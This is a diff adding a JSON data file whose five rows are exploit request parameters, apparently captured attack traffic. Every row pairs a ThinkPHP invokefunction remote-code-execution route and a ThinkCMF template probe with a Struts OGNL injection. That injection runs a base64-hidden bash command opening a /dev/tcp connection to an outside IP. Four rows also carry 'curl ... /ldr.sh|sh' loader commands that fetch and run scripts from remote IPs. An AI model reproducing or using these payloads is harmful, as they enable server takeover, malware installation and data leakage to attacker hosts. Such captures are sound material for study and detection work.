@@ -1,0 +1,52 @@
+{
+ "parameters": [
+  {
+   "name": "content",
+   "uuid": "05ed9e66-6545-4d14-ab09-33b4acb70086"
+  },
+  {
+   "name": "id",
+   "uuid": "13b5b39d-4986-4574-967c-1ea7aa46628a"
+  },
+  {
+   "name": "s",
+   "uuid": "5437bc95-7b66-44cb-8162-492ffee655ba"
+  },
+  {
+   "name": "vars_0_",
+   "uuid": "26ca1da4-e917-4d6a-820f-5b36f915517d"
+  }
+ ],
+ "rows": [
+  {
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "id": "%{\n(#request.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + \n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + \n(#request.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) + \n(#request.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + \n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) + \n(#request.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + \n(#request.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'bash -c {echo,ZXhlYyAzPD4vZGV2L3RjcC80NS4xNTUuMjA1LjEwOC80OTc4CmVjaG8gLWVuICI1Mi4xOC4xMjkuMTEwOjgwO2lkXHJcbiIgPiYz}|{base64,-d}|{bash,-i}'}))\n}",
+   "s": "/Index/\\think\\app/invokefunction",
+   "vars_0_": "shell_exec"
+  },
+  {
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "id": "%{\n(#request.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + \n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + \n(#request.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) + \n(#request.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + \n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) + \n(#request.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + \n(#request.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'bash -c {echo,ZXhlYyAzPD4vZGV2L3RjcC80NS4xNTUuMjA1LjEwOC80OTc4CmVjaG8gLWVuICI1Mi4xOC4xMjkuMTEwOjgwO2lkXHJcbiIgPiYz}|{base64,-d}|{bash,-i}'}))\n}",
+   "s": "/Index/\\think\\app/invokefunction",
+   "vars_0_": "curl --user-agent curl_tp5 http://31.210.20.181/ldr.sh|sh"
+  },
+  {
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "id": "%{\n(#request.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + \n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + \n(#request.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) + \n(#request.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + \n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) + \n(#request.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + \n(#request.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'bash -c {echo,ZXhlYyAzPD4vZGV2L3RjcC80NS4xNTUuMjA1LjEwOC80OTc4CmVjaG8gLWVuICI1Mi4xOC4xMjkuMTEwOjgwO2lkXHJcbiIgPiYz}|{base64,-d}|{bash,-i}'}))\n}",
+   "s": "/Index/\\think\\app/invokefunction",
+   "vars_0_": "curl --user-agent curl_tp5 http://194.40.243.98/ldr.sh|sh"
+  },
+  {
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "id": "%{\n(#request.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + \n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + \n(#request.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) + \n(#request.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + \n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) + \n(#request.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + \n(#request.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'bash -c {echo,ZXhlYyAzPD4vZGV2L3RjcC80NS4xNTUuMjA1LjEwOC80OTc4CmVjaG8gLWVuICI1Mi4xOC4xMjkuMTEwOjgwO2lkXHJcbiIgPiYz}|{base64,-d}|{bash,-i}'}))\n}",
+   "s": "/Index/\\think\\app/invokefunction",
+   "vars_0_": "curl --user-agent curl_tp5 http://31.42.177.123/ldr.sh|sh"
+  },
+  {
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "id": "%{\n(#request.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + \n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + \n(#request.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) + \n(#request.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + \n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) + \n(#request.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + \n(#request.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'bash -c {echo,ZXhlYyAzPD4vZGV2L3RjcC80NS4xNTUuMjA1LjEwOC80OTc4CmVjaG8gLWVuICI1Mi4xOC4xMjkuMTEwOjgwO2lkXHJcbiIgPiYz}|{base64,-d}|{bash,-i}'}))\n}",
+   "s": "/Index/\\think\\app/invokefunction",
+   "vars_0_": "curl --user-agent curl_tp5 http://31.210.20.120/ldr.sh|sh"
+  }
+ ]
+}
